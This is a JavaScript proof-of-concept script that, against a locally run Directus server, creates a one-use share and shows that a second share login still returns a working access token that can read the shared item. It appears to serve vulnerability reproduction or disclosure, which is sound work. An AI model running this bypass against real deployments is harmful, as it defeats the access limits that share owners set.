const base = 'http://127.0.0.1:8055';

async function request(path, { method = 'GET', token, body } = {}) {
  const response = await fetch(base + path, {
    method,
    headers: {
      ...(body ? { 'content-type': 'application/json' } : {}),
      ...(token ? { authorization: `Bearer ${token}` } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await response.text();
  let json;
  try { json = text ? JSON.parse(text) : {}; } catch { json = { raw: text }; }
  return { status: response.status, json };
}

async function expectStatus(label, result, expected) {
  if (result.status !== expected) {
    throw new Error(`${label}: expected HTTP ${expected}, got ${result.status}: ${JSON.stringify(result.json)}`);
  }
}

const email = process.env.ADMIN_EMAIL;
const password = process.env.ADMIN_PASSWORD;

let health;
for (let i = 0; i < 60; i++) {
  try {
    health = await request('/server/health');
    if (health.status > 0) break;
  } catch {}
  await new Promise((resolve) => setTimeout(resolve, 2000));
}
if (!health || !health.status) throw new Error('Directus HTTP server did not respond');
console.log(`Directus HTTP server responded (health endpoint HTTP ${health.status}); continuing with authenticated API checks.`);

const adminLogin = await request('/auth/login', {
  method: 'POST',
  body: { email, password },
});
await expectStatus('Admin login', adminLogin, 200);
const adminToken = adminLogin.json.data?.access_token;
if (!adminToken) throw new Error('Admin login did not return data.access_token');

const collectionsResult = await request('/collections?fields=collection&limit=100', { token: adminToken });
await expectStatus('List collections', collectionsResult, 200);
const collectionNames = (collectionsResult.json.data ?? []).map((entry) => entry.collection);

let target;
for (const collection of collectionNames) {
  const items = await request(`/items/${encodeURIComponent(collection)}?limit=1&fields=*`, { token: adminToken });
  if (items.status === 200 && Array.isArray(items.json.data) && items.json.data.length > 0) {
    const item = items.json.data[0];
    const primaryKey = item.id ?? item.uuid;
    if (primaryKey !== undefined && primaryKey !== null) {
      target = { collection, item: primaryKey };
      break;
    }
  }
}
if (!target) {
  throw new Error(`Could not find a readable collection with an existing id-keyed item. Collections: ${collectionNames.join(', ')}`);
}
console.log(`Using existing item ${target.collection}/${target.item} for the share.`);

const createShare = await request('/shares', {
  method: 'POST',
  token: adminToken,
  body: {
    name: 'HTTP max_uses security reproduction',
    collection: target.collection,
    item: target.item,
    max_uses: 1,
  },
});
await expectStatus('Create share', createShare, 200);
const shareId = createShare.json.data?.id;
if (!shareId) throw new Error(`Share creation returned no ID: ${JSON.stringify(createShare.json)}`);
console.log(`Created share ${shareId} with max_uses=1.`);

const firstLogin = await request('/shares/auth', {
  method: 'POST',
  body: { share: shareId },
});
await expectStatus('First share login (consume allowed use)', firstLogin, 200);
if (!firstLogin.json.data?.access_token) throw new Error('First share login returned no access token');
console.log('First share login: HTTP 200 (usage limit consumed).');

const secondLogin = await request('/shares/auth', {
  method: 'POST',
  body: { share: shareId },
});
await expectStatus('Second share login after max_uses reached', secondLogin, 200);
const shareToken = secondLogin.json.data?.access_token;
if (!shareToken) throw new Error('Second share login returned no access token');
console.log('SECOND share login after max_uses=1: HTTP 200 and access token returned.');

const shareRecord = await request(`/shares/${shareId}?fields=id,max_uses,times_used`, { token: adminToken });
await expectStatus('Read share usage counter', shareRecord, 200);
const { max_uses: maxUses, times_used: timesUsed } = shareRecord.json.data ?? {};
if (maxUses !== 1 || timesUsed !== 2) {
  throw new Error(`Unexpected counter state: max_uses=${maxUses}, times_used=${timesUsed}`);
}
console.log(`Counter verified over HTTP: max_uses=${maxUses}, times_used=${timesUsed}.`);

const sharedRead = await request(`/items/${encodeURIComponent(target.collection)}/${encodeURIComponent(target.item)}?fields=*`, { token: shareToken });
await expectStatus('Read shared item using second token', sharedRead, 200);
if ((sharedRead.json.data?.id ?? sharedRead.json.data?.uuid) !== target.item) {
  throw new Error(`Share token did not return the expected shared item: ${JSON.stringify(sharedRead.json)}`);
}
console.log('Shared item read using the SECOND token: HTTP 200.');
console.log('CONFIRMED: HTTP-level max_uses bypass reproduced against a booted Directus server.');
